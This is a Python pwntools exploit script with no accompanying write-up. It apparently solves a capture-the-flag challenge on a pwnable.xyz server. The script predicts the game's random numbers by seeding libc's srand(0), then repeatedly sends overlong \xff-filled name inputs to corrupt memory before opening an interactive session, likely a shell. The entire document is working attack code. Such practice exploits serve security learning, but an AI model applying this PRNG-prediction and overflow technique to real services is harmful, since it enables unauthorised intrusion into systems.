from pwn import *
from ctypes import *

context.log_level = 'debug'
#e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30024)
lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

sla(':','Y')
sa(':','A'*44)
sa('>','9')
lib.srand(0)
score = 0

def f():
	p.recvuntil('score: ')
	score = int(p.recvline().strip())
	log.info('score : {}'.format(score))
	rand = lib.rand()
	log.info('rand : {}'.format(rand))
	sla('>',str(0xffffffff))

def g(name):
	p.recvuntil('score: ')
	score = int(p.recvline().strip())
	log.info('score : {}'.format(score))
	rand = lib.rand()
	log.info('rand : {}'.format(rand))
	sla('>',str(rand))
	sa('Save? [N/y]','y')
	sa(':',name)

def lose():
	p.recvuntil('score: ')
	score = int(p.recvline().strip())
	log.info('score : {}'.format(score))
	rand = lib.rand()
	log.info('rand : {}'.format(rand))
	sla('>',str(0))

if __name__ == '__main__':
	f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*49);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*50);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*49);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*51);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*49);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*50);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*49);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*48);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*47);
	f(); f(); g('\xff'*45);
	f(); f(); g('\xff'*46);
	f(); f(); g('\xff'*45);
	f(); f();
	lose();

	p.interactive()